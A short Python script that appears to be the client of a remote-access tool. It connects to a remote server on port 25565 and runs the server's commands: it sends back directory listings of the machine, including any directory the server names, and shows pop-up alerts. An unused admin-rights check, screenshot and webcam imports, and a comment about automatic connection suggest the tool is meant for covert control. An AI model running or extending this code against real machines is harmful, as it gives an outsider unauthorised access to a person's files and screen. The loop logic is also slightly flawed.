import os
import socket
import pyscreenshot
from tkinter import messagebox
import warnings
import traceback
import tkinter
import pickle
import shutil
import ctypes
import sys
import cv2

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Connect to server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = input(str("Input server address: ")) # To automatically connect, port foward and assign to the host
port = 25565
header = 64

try:
    sock.connect((host, port))
    print("Success: connected to server")
except OSError:
    print("Host not found")
    sys.exit()

# Commands
ss_num = 0

while True:
    command = sock.recv(1024).decode()

    if command == "list":
        files = os.listdir()
        sock.send(str(files).encode())
    
    elif command == "listfrom":
        fromdir = sock.recv(5000).decode()
        files = os.listdir(fromdir)
        sock.send(str(files).encode())
    
    if command == "showalert":
        title = sock.recv(5000).decode()
        message = sock.recv(5000).decode()

        root = tkinter.Tk()
        root.withdraw()
        messagebox.showwarning(title, message)

    if command == "disconnect":
        sock.close()